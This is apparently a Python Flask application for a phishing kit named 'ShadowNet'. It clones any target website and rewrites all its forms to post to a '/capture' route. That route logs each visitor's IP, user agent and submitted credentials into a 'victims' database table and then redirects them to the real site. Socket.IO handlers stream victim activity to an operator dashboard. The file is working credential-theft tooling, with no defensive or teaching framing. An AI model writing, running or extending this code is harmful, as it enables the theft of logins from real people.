from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit
import requests
from bs4 import BeautifulSoup
import sqlite3
import uuid
import os
from config import Config

app = Flask(__name__)
app.config.from_object(Config)
socketio = SocketIO(app)

# Ensure templates directory exists
os.makedirs('templates', exist_ok=True)
os.makedirs('static/css', exist_ok=True)
os.makedirs('static/js', exist_ok=True)

def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                      (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, credentials TEXT, cookies TEXT, campaign_id TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/create', methods=['POST'])
def create_phish():
    target_url = request.form['target_url']
    try:
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Modify forms to post to our server
        for form in soup.find_all('form'):
            form['action'] = '/capture'
        
        # Generate unique ID for this campaign
        campaign_id = str(uuid.uuid4())
        
        # Save the modified HTML
        with open(f'templates/phish_{campaign_id}.html', 'w') as f:
            f.write(str(soup))
        
        return jsonify({'success': True, 'url': f'/phish/{campaign_id}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/phish/<campaign_id>')
def serve_phish(campaign_id):
    # Check if the template exists
    template_path = f'phish_{campaign_id}.html'
    if not os.path.exists(os.path.join('templates', template_path)):
        return "Phishing page not found", 404
    
    return render_template('phish_page.html', campaign_id=campaign_id)

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    credentials = request.form.to_dict()
    campaign_id = request.form.get('campaign_id', '')
    
    victim_id = str(uuid.uuid4())
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("INSERT INTO victims VALUES (?, ?, ?, ?, ?, ?)",
                   (victim_id, ip, user_agent, str(credentials), "", campaign_id))
    conn.commit()
    conn.close()
    
    # Redirect to original site
    return redirect(request.form.get('redirect', 'https://google.com'))

@socketio.on('connect')
def handle_connect():
    emit('status', {'msg': 'Connected to ShadowNet'})

@socketio.on('victim_activity')
def handle_victim_activity(data):
    emit('update', data, broadcast=True)

@socketio.on('permission_granted')
def handle_permission_granted(data):
    emit('permission_update', data, broadcast=True)

if __name__ == '__main__':
    init_db()
    socketio.run(app, debug=True, host=app.config['HOST'], port=app.config['PORT'])
